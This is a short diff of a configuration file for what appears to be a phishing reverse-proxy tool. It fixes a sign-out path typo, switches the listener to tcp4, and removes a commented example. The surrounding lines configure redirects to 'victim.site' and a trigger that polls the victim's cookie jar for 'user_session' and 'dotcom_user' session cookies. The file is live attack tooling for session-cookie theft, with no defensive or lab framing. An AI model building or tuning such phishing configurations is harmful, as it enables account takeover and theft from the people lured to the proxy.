@@ -11,7 +11,7 @@
 
 	# Listen announces on the local network address.
 	# The network must be "tcp", "tcp4", "tcp6"
-	listener = "tcp"
+	listener = "tcp4"
 
     # Listeninng TCP Port
     port = 443
@@ -98,7 +98,7 @@
     redirectTo = "https://victim.site"
 
 [[drop]]
-    path = "/singout"
+    path = "/signout"
     redirectTo = "https://victim.site"
 
 
@@ -155,11 +155,6 @@
         type = "cookies"
         values = ["user_session", "dotcom_user"]  # values can be cookies names or relative paths
         delay = 5   # check every 5 seconds victim's cookie jar to see if we need to instrument something
-
-        # type path example (triggers when the victim goes to a specific relative URL):
-        # type = "path"
-        # values = ["/settings/profile"]
-        # delay = 5
 
 #
 # STATIC SERVER
